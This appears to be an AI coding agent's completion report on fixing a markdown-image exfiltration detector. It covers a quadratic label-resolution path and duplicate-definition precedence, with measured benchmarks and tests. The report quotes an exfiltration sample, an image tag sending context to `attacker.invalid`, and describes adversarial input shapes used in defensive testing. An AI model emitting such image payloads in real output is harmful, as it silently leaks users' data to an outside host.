STATUS: DONE

# T81 — closing T78#F-001 (attacker-chosen label budget) and T78#F-002 (duplicate definition precedence)

Scope was the two blockers T78 reproduced at a public boundary, and nothing else. No other finding
was re-opened; the three T72 blockers, the three T72 majors, the eleven matrices, the necessity of
the T77 label condition and the viability refutation were all left exactly as T78 confirmed them.

Files changed: `src/security/detect/exfil.ts`, `src/security/detect/exfil.test.ts`. **No change to
`docs/requirements/keryx-agent-first-core/policies.md`** — see "Why the normative text did not move".

## Part 1 — F-001: the property the new bound has, and the demonstration

### What was wrong, restated so the next round does not repeat it a fourth time

`LabelBudget.maxLength` was "the longest key this document's own `[ref]: URL` lines produced". It is a
number read out of the payload, and the payload is the attacker's. T77's reasoning — "a bound derived
from the input is not an arbitrary bound a future round can defeat" — is right about *arbitrary* and
wrong about *derived*: derived from the **input** is derived from the **adversary**. This was the
third bound on the same path (T71's constant 999; T77's derived maximum), so the thing to establish is
not that a number is big enough but a property:

> **P — no quantity the document can write changes the asymptotic cost. Total label work is
> Θ(content.length). The only thing an attacker can inflate is the input's own size.**

### The formulation, and why each part is not inflatable

**(1) The `!` gate moved in front of the work it gates.** `readBracketConstructs` takes a
`wantReference` parameter. The inline pass passes `false` (it reads only `kind === "inline"` and threw
every reference construct away); the reference pass passes `isImage` (its `!` test used to sit at
`:1335`, *after* the constructs were built). Behaviour-preserving by construction: the constructs no
longer built are exactly the ones both callers already discarded. Effect: a run of `[` — the shape both
prior rounds measured, and T78's `balancedNest_withLongDef` and `openRunOneClose_withLongDef` — now
allocates nothing at all, whatever the definitions say.

**(2) Two necessary conditions, one of them structurally guaranteed.** A key is `REFERENCE_DEF`'s
first capture, `[^\]]+`. **No key can ever contain `]`**, whatever the attacker writes; `normaliseLabel`
(trim / collapse whitespace runs / lowercase) neither adds nor removes one; therefore a span carrying
a `]` cannot equal any key. That is a fact about the grammar, checkable by reading one regex — not a
measurement and not a number. The same argument for `[` gives a second condition whose threshold *is*
derived (the most `[` any key carries, normally 0), so it is used only to keep the common case cheap,
never as the bound.

The part that matters is the structural consequence, and it is a proof rather than a measurement:
after (2) a candidate span carries no `]`, and with the ordinary `[` threshold of 0 it carries no `[`
either — so the `[` that opens it is the **last** `[` before the `]` that closes it. Two such spans
cannot share either endpoint, so the candidate spans are pairwise **disjoint** and their total length
is at most `content.length`. Linear, with no constant to choose.

**(3) A total-work budget for the one filter a document can raise.** Defining a label that itself
contains `[` raises the `[` threshold. Against that, `LabelBudget.work` starts at
`LABEL_WORK_FACTOR * content.length` characters of slicing and is decremented by each span actually
sliced. When it is exhausted the label path stops slicing **and every reference definition in the
document is flagged**. `LABEL_WORK_FACTOR = 8` is stated plainly as what it is: it is **not** a bound
on any label, span or document length — it is a multiplier on the input's own size, so total work is
Θ(n) for every document. An honest document spends far less than one multiple of itself: at most two
candidate spans per `![` open, and by (2) those spans are disjoint.

Failure direction, which is the part that distinguishes this from the two bounds before it: exhausting
the budget produces **more** findings, never a release. What is not examined is not let through. The
allowlist still decides whether each flagged definition is a finding, so the backstop widens what is
**examined**, not what is **denied** — pinned by a test that shows an allowlisted definition still
released under exhaustion.

**Why an attacker cannot inflate it.** Every term is either the input's own length (part 3), or a
property with a structural guarantee independent of the payload (part 2's `]` rule), or a filter that
can only reduce work below the part-3 ceiling (part 2's `[` rule, and T77's `maxLength` condition,
which is kept because it is sound and cheap but is no longer load-bearing). There is no path on which
writing more of something buys more than linear work, and the one path that could buy a large constant
ends in a finding rather than a release.

### The demonstration — not asserted, measured

**(a) The reviewer's own adversarial shape.** `T78-perf.ts` unmodified, before and after:

| Shape | bytes | before (ms) | after (ms) | before exp | after exp |
|---|---|---|---|---|---|
| `balancedNest_withLongDef` | 400 029 | **20 802.7** | **49.5** | 1.79 | 1.14 |
| `openRunOneClose_withLongDef` | 300 030 | **7 240.0** | **21.8** | 2.11 | 0.91 |
| `bangOpenRunOneClose_withLongDef` | 300 030 | **4 561.8** | **16.6** | 1.78 | 0.84 |
| `balancedNest_noDef` (control) | 200 000 | 43.4 | 47.0 | 0.85 | 1.61* |
| `openRunOneClose_shortDef` | 100 034 | 18.8 | 17.5 | 1.06 | 1.11 |

`shapesOverOneSecond: []`, and the only `superLinearShapes` entry is the untouched no-definition
control at 6.8→47 ms across 25 KB→200 KB (*exponent noise on sub-50 ms timings; its deep ladder below
is flat in ms per open).

**(b) Shapes I constructed against each part of the repair** (`T81-perf.ts`, best of three per point):

| Shape | what it defeats | largest measured | ms | exponent |
|---|---|---|---|---|
| `bangBalancedNest_withLongDef` | part 1 (`![` opens, so the gate does not help) | 500 029 | 62.0 | 1.25 |
| `bangOpenRun_bracketKeyDef` | part 2 (a key with 60 000 `[`) | 260 031 | 47.4 | 1.02 |
| `bangBalancedNest_bracketKeyDef` | parts 1+2 together | 360 030 | 104.8 | 1.10 |
| `wsInflatedBangRun_withLongDef` | the non-whitespace length filter | 500 030 | 28.5 | 1.02 |
| `wsInflatedBangRun_tabsAndNewlines` | the same, with tabs and newlines | 700 030 | 27.6 | 0.94 |
| `bangRunManyCloses_withLongDef` | every open a candidate label | 600 029 | 124.6 | 1.78† |
| `resolvingBangRun_everyUseHits` | every label actually resolving | 700 033 | 90.2 | 1.10 |
| `manyDefsOfDistinctLengths_thenBangRun` | 600 definitions of 600 distinct lengths | 397 701 | 21.5 | 0.93 |
| `prose_sentenceLabelDef` | the shape that does not look crafted | 128 036 | 9.2 | 1.06 |

† `bangRunManyCloses_withLongDef`'s 1.78 was measured in a process that had already built four other
multi-megabyte payloads. Re-measured one shape per process (`T81-scale.ts`, `T81-after-scale.log`) it
is flat in cost per open — 103 → 139 → 204 → 262 → 313 ms per megabyte across 400 KB → 3.4 MB, against
58 → 146 for the same body with **no definition at all**, a path this round did not touch. The residual
drift is the same in both, so it is the two markdown walks' per-byte cost and the `balanced` Map's
growth, not the label path.

**(c) The inflation table — the demonstration that answers P directly.** Total bytes held **constant**
at 262 144 while the quantities a payload can choose are swept. A bound an attacker can inflate shows
up here as a climbing column; a bound on total work does not.

| definition label length | 0 | 4 | 64 | 1 000 | 20 000 | 100 000 |
|---|---|---|---|---|---|---|
| ms | 12.6 | 25.9 | 23.9 | 23.7 | 29.1 | 23.3 |

| `[` inside the definition label | 0 | 1 | 10 | 1 000 | 20 000 | 60 000 |
|---|---|---|---|---|---|---|
| ms | 26.5 | 26.5 | 26.4 | 27.8 | 32.3 | 38.8 |

| number of definitions | 1 | 10 | 100 | 1 000 | 5 000 |
|---|---|---|---|---|---|
| ms | 24.4 | 24.8 | 24.4 | 18.1 | 4.0 |

Spread across five orders of magnitude of the attacker's dial: **16.5 ms** and **12.4 ms**. Before this
round the first table's last column would have been the 20-second row.

**(d) The four public boundaries.** `T78-boundary.ts` unmodified, on its own 128 029-byte payload:

| Boundary | before | after |
|---|---|---|
| `dispatchCallTool` | 1 948.1 ms | **20.5 ms** |
| `prepareOutputForPersistence` | 1 958.3 ms | **17.7 ms** |
| `validateOutputForTransport` | 2 278.0 ms | **17.1 ms** |
| `redactToolOutput` | 1 989.5 ms | **19.7 ms** |
| ladder 256 029 bytes, detector | 8 368.6 ms | **31.9 ms** |
| prose variant 64 036 bytes | 497.1 ms | **4.4 ms** |

`boundariesOverOneSecond: []`.

**(e) The boundaries past anything nine rounds measured** (`T81-boundary.ts`, one shape per process,
best of three, worst boundary per cell):

| bytes | `balancedNest_withLongDef` | `bangRunManyCloses_withLongDef` | `bangRunManyCloses_noDef` (control) | `budgetExhausting` |
|---|---|---|---|---|
| 131 072 | 70.2 | 56.8 | 21.8 | 118.7 |
| 262 144 | 155.6 | 93.1 | 30.9 | 151.4 |
| 524 288 | 534.9 | 151.2 | 61.9 | 211.0 |
| 1 048 576 | **564.6** | 322.6 | 165.7 | 496.9 |

**Worst shape found, and its cost: `balancedNest_withLongDef` at 1 048 575 bytes — 564.6 ms at
`redactToolOutput`, the worst single boundary reading anywhere in this round.** No shape at any size up
to a megabyte costs more than a second at any of the four boundaries. The `budgetExhausting` rows are
the ones that spend the whole work budget: every one reports `redaction.state: "redacted"` with the
attacker host **absent**.

### Honest caveat on the numbers

This machine showed up to 5× run-to-run variance on payloads of this size when several megabyte-scale
shapes were built in one process; a first cold reading of the 1 MB rows above was 1.8–3.0 s where the
warmed best-of-three is 0.3–0.6 s, and the definition-**free** control moved with them. Every table
above is best-of-three, one shape per process where the payload exceeds a megabyte, and the variance
is disclosed rather than averaged away. The load-bearing claims — the growth exponents, the inflation
table's flatness, and the before/after ratios at a fixed size — are unaffected by it, because both
sides of each comparison were measured the same way.

### What I did NOT do, and why

- **No fixed length constant was reintroduced.** There is still no bound on a label's length. The
  criterion is unchanged: is the label defined in this document.
- **The inline pass's discarded reference constructs**, which T78 named, are gone (part 1). It is the
  single largest contributor: it removes the label path entirely for every non-`!` bracket.
- I did **not** take T78's suggestion (b) — "tighten to *exactly* a length some key has". It is
  unsound in this codebase: `String.prototype.toLowerCase` can *lengthen* a string (`İ` → two code
  units), so a span's computed normalised length is a lower bound, not an equality, and an exact-length
  filter would exclude a span a renderer resolves. The `]`/`[` conditions give the same asymptotic win
  with a soundness argument that does not depend on any case-mapping table.
- I did **not** build a normalised-stream index with rolling hashes, which would make the lookup O(1)
  in the key length. It is defeated by JS's context-sensitive lowercasing: `"ΟΣ".toLowerCase()` is
  `"ος"` but `"Σ".toLowerCase()` is `"σ"` (Final_Sigma), so a per-position or whole-document lowercase
  stream does not agree with `normaliseLabel(span)` at a span boundary, and the disagreement is exactly
  a released label. Recorded here because it is the obvious next idea.

## Part 2 — F-002: duplicate definitions

`refs` was `Map<string, {url, start}>` written with `set`, so the last definition won. CommonMark:
*"If there are several matching definitions, the first one takes precedence."* Measured before the
change on this tree (`T81-before-T78-dup.log`): six spellings, `marked` emits
`<img src="https://attacker.invalid/p?ctx=CTX">` for all six, and all four public boundaries carry the
attacker host with `redaction.state: "redacted"` — the caller is told the payload was handled.

**The one-line fix works, and I did not use it alone.** I verified it rather than taking the reviewer's
word: with the definition table reduced to first-wins (a temporary edit, reverted, log
`T81-firstwins-T78-dup.log`), `T78-dup.ts` reports `leakingCount: 0` with all six rows at one finding
and the control unchanged. It does **not** close the reversed order I added — a document whose
*second* definition is the attacker's leaves that URL in the output as text; no renderer fetches it,
so it is not a zero-click leak, but the payload still carries the host after a `state:"redacted"`
report. I implemented the stronger version the reviewer offers
as the alternative: the table's value is a **list**, and every definition of a label an image use
resolves is flagged. It subsumes first-wins (the first definition is always among the flagged), so it
is correct under CommonMark's precedence *and* under a renderer with the opposite one. The reason for
preferring it is this file's recorded history: nine rounds, and the recurring cause every time was a
layer judging text in a form the renderer does not use. Picking a precedence rule is that same bet;
flagging every definition is not a bet at all. The cost is one extra masked URL in a document with an
accidental duplicate, and the benign corpus shows zero such documents in this checkout.

After: `T81-after-T78-dup.log` — `leakingAtAnyBoundary: []`, `leakingCount: 0`; the six rows now report
2, 2, 2, 2, 2 and 3 findings with the host absent at all four boundaries; the control `c1SingleDef` is
unchanged at 1 finding. `T78-md.ts` moves `dupFirstAttacker` and `dupFirstAttackerAllowlisted` from
`bypasses` to `closed`, and `bypasses` is now `[]`; every other row in that matrix is byte-identical.

Pinned by `T81#F-002` in `exfil.test.ts`, which fails on the pre-change tree: seven shapes (the
reviewer's six plus the reversed order, where the attacker's definition is the second one — the repair
must not close one order by opening the other) checked at the detector, through `applyRedaction`,
through `prepareOutputForPersistence` and through `validateOutputForTransport`, with four controls
(single definition, a duplicate pair no image resolves, a duplicate pair nothing points at, and an
allowlisted duplicate pair).

`maxLabelLength` is unaffected: duplicates share a normalised key, hence a length.

## Why the normative text did not move

The dispatch permits editing the auto-fetch subsection of `policies.md` **only if** this change makes
its current wording untrue. It does not, in either direction:

- *«перечень полный, не пример»* was **false while F-002 was open** (T78's own consequence note) and
  becomes **true** again now that it is closed. Making a false sentence true is not a reason to edit it,
  and T78 states explicitly that it needs no named-exception list if F-002 is fixed this round.
- *«ограничения на длину label нет: единственный критерий — определён ли такой label в самом
  документе»* stays true. Nothing added here is a length bound, and neither new condition can release
  a label the table defines: the `]` and `[` conditions reject only spans that could not have equalled
  a key, and the work budget's exhaustion **flags every definition**, so a document that exhausts it
  produces a superset of the findings it would have produced by resolving. There is no input for which
  a defined label's image use is released because of this round.
- `Version:` therefore stays at `0.1.4`, per T78's instruction to bump it only if the sentence changes.

## Verification

Every command run from `/Users/Goodea/goodea/keryx`, no git state change, no network, no model call,
synthetic and reserved hosts only. Raw logs under `/Users/Goodea/goodea/keryx/.metaproject/data/gdctx/raw/`.

### Reviewer probes, unmodified, before and after

| Probe | before | after |
|---|---|---|
| `T78-dup.ts` | `leakingCount: 6`, all four boundaries, `state:"redacted"` | **`leakingCount: 0`** |
| `T78-perf.ts` | `shapesOverOneSecond: [3]`, exponents 1.79 / 2.11 / 1.78 | **`[]`**, exponents 1.14 / 0.91 / 0.84 |
| `T78-boundary.ts` | `boundariesOverOneSecond: [all four]`, 1 948–2 278 ms | **`[]`**, 17.1–20.5 ms |

Logs: `T81-before-T78-{dup,perf,boundary}.log`, `T81-after-T78-{dup,perf,boundary}.log`.

### Prior matrices, before and after, by hash — 16 of 18 byte-identical

Runner: `T81-matrices.sh` (`before` / `after`). Every hash below is **identical before and after**, and
each also equals the value T78 recorded, so the agreement is now five-way (T66/T72/T77/T78/T81) on the
eleven it names:

| Matrix | SHA-256 (before = after) |
|---|---|
| `T42-exfil-attack` | `0646c50821177132e3e84528af5557b609f244fc13f109224de1496f879222ba` |
| `T24-recheck2-exfil` | `8c9bfec0481cd22957d98f5cd17f4ee37eb9a2c2d1d86bd88593d36bf2abf519` |
| `T42-charrefs` | `698d88993076fd92aad9b4a4e1f8235a0eac2b7490baa0d34d8d1c65cac1b452` |
| `T53-extract` | `ad20286ba1aab3f8e810d3c84f6a8610ba96e6362e810b5caf476f50b80834ad` |
| `T53-resolve` | `0603791031f8f078bf7481c787fc828859306e62f95cc2109bf253c8b53cb2e4` |
| `T53-base` | `3416d62e56b7674e1208cd0bcb0aa9b3a3484f7baa50612c2819d56d8872254c` |
| `T53-boundary` | `398012ceb8654c55f51235fd5548e0576c3369c7cf8159c251ccb2ff69b3768d` |
| `T42-boundary` | `7030455d39a56b12e98c75b8a74c699a3d488dbf9d04b4ac060bfe9151f957c8` |
| `T24-recheck2-boundary` | `838399622c42414f63dbda91cdd9c61dd0b4f83982c630ec1c34f5abeff3064b` |
| `T52-base` | `a04404db8a1571b102dc21ae85517b3345eb94496553c0fb8bded5811010dff2` |
| `T46-surfaces` | `d8348c995f7686e16bac791caa429de427d31e02c4ec1b6c8fe6c48e0f959bf8` |
| `T72-md` | `15866b62cdf0475d34dae2b52ce00bedc45d13feb3a66287670edb639ee98837` |
| `T72-gates` | `e4d04c18f33619337e7182b055ecc5a792c40b15fe1491e7f5c369b0caf75d68` |
| `T72-srcset` | `2e96f8d79ee8d8a4a9b3190781677066cb7e16e71dbdb927d58889a678021000` |
| `T72-doc` | `69df9705d0853dabccb91b6cde5d9085fe1262ee737485322d9dfb67139a6433` |
| `T77-doc` | `bee363071aa41a1a7b5dd24eab82cd79ef54a550fed73cf14f532bbe259dc718` |
| `T78-corpus` | `3fb901e34661d3beb25750dbc125d06a96589bb48e87f03d5a97f2f8ce24881c` |

Two moved, both **expected and diffed line by line**:

- `T78-md` `fcdccacc…` → `4a9034bc…`. The whole diff is three rows: `dupFirstAttacker`
  `verdict BYPASS → closed` (findings 1 → 2, `maskedOutputStillHasAttacker true → false`),
  `dupFirstAttackerAllowlisted` `BYPASS → closed` (0 → 1 finding), the allowlisted control's finding
  count 1 → 2, and the two ids moving from `bypasses` to `closed`, leaving `bypasses: []`. Nothing
  else in the matrix changed.
- `T53-corpus` `43c5610b…` → `a0a89d9d…`. The **benign** numbers are unchanged (below); what moved is
  the whole-repository Part A header, and it moved because of files **I** wrote between the two runs.

### Benign corpus — unchanged, and the delta explained with the right vector

| | before | after |
|---|---|---|
| `benignFilesWithFindings` | 16 | **16** |
| `benignFindings` | 62 | **62** |
| Part B flagged | 7 | **7**, the same ids |
| the 16 file rows | — | byte-identical |

`filesScanned` 23 222 → 23 247 and `totalFindings` 616 → 619 / `filesWithFindings` 96 → 97. The +25
scanned files are the logs this task wrote into `.metaproject/data/gdctx/raw/` between the two runs.
**The one new file carrying findings is `T81-after-T78-dup.log`**, with exactly 3
(`egress.markdown-image-exfil` ×2, `egress.markdown-link-sensitive-value` ×1) — the duplicate probe's
own output, which quotes `![a]` uses and `attacker.invalid` definitions. Its `before` twin already
existed when the `before` corpus run happened (the baseline probes ran first), so it is counted on
both sides and only the `after` copy is new; that is why the delta is one file and not two.
Enumerated rather than narrated: every `T81-*` file in that directory was run through `detectExfil`,
and the only ones carrying findings are the three copies of that same probe log. No repository file's
status changed, no new policy id, no new benign carrier.

(T78#F-003 recorded that T77 named the wrong vector for its own +2. This is the same trap, so the
vector here is named by enumeration rather than by narrative.)

### Suites, types, lint

- `bun test src/security/detect/exfil.test.ts src/security/output-validation.test.ts src/mcp/structural-redaction.test.ts src/security/persistence-sinks.test.ts` → **112 pass / 0 fail / 1 168 expect(), exit 0** (`T81-after-suites.log`). T78 recorded 109/0/1 110; the deltas are the three tests added here.
- Red evidence: on the pre-change tree the same file was **58 pass / 3 fail / 816 expect()**, with the
  three new tests failing for the right reasons — `["balancedNest_withLongDef=24905.4ms", …9 shapes]`,
  the budget test at `elapsed<500ms:false`, and the duplicate test on the attacker host still present.
  The file took **126.07 s** to run then and **462 ms** now.
- `bun run typecheck` (`tsc --noEmit`) → clean.
- `bunx eslint src/security/detect/exfil.ts src/security/detect/exfil.test.ts` → 0 problems. The three
  new `T81-*.ts` probes report "File ignored because no matching configuration was supplied", as every
  prior round's probes do.

### Tooling disclosure

`bun` was invoked directly for every probe and suite rather than through `keryx ctx run`: the per-shape
timing rows and the per-case verdicts ARE the evidence, and this project's compaction elides them —
the same disclosure T46, T53, T63, T66, T71, T72, T77 and T78 each made, and the dispatch's own
instruction. `keryx ctx rg` was used for the two code searches; two `grep`-shaped reads were refused by
the routing hook and re-issued through `ctx rg`/`ctx read` instead, so no raw `rg`/`grep` ran.

## Concerns

1. **The cost is linear, not free, and linear crosses a second eventually.** At a megabyte the worst
   boundary reading is 564.6 ms; the growth is linear-with-a-log, so ~2 MB of adversarial markdown
   would cross a second, and so would ~3.5 MB of markdown carrying **no reference definition at all**
   (the control path this round did not touch). If the floor needs a hard wall-clock guarantee rather
   than a per-byte one, that is a size cap at the boundaries, not a change in this file, and it belongs
   to whoever owns `dispatch.ts` / `guard.ts`.
2. **`LABEL_WORK_FACTOR = 8` is a constant, and I am naming it as one.** It is not a bound on any
   length and cannot be defeated by writing more of anything — the cost stays Θ(input) whatever it is —
   but it does decide *where* a document stops being examined by resolution and starts being covered by
   blanket flagging. Its failure direction is more findings, and the allowlist still applies, so the
   worst it can do is mask a definition in a document nobody would write. I did not find a document
   under a megabyte that reaches it other than by defining a label containing tens of thousands of `[`.
3. **Flagging every definition of a duplicated label is deliberate over-approximation.** A document
   with an accidental duplicate now carries one extra masked URL. Zero instances in this checkout's
   benign corpus, and the remedy is the same allowlist as every other false positive in this floor —
   but it is a widening, and a future round that finds it noisy should reach for first-wins
   (`if (!refs.has(ref))`), which I verified also closes all six spellings, rather than for anything
   cleverer.
4. **The megabyte-scale timings are noisy on this machine** (up to 5×). Disclosed in full above with
   both the cold and the warmed readings rather than reported as a single number.
5. **T78#F-003, F-004 and F-005 are untouched**, as the scope decision requires; they remain
   documentation-grade and belong in `RESIDUALS.md`, which is not mine to edit under this dispatch.
6. **The `!` gate now decides whether a bracket run is read as a label at all.** It was always the gate
   that decided whether a *finding* was pushed, so no coverage moved — every matrix agrees — but it is
   now load-bearing for cost as well as for behaviour, and a future round that widens the floor to
   reference *links* must move `wantReference` with it or it will silently re-open the quadratic path.
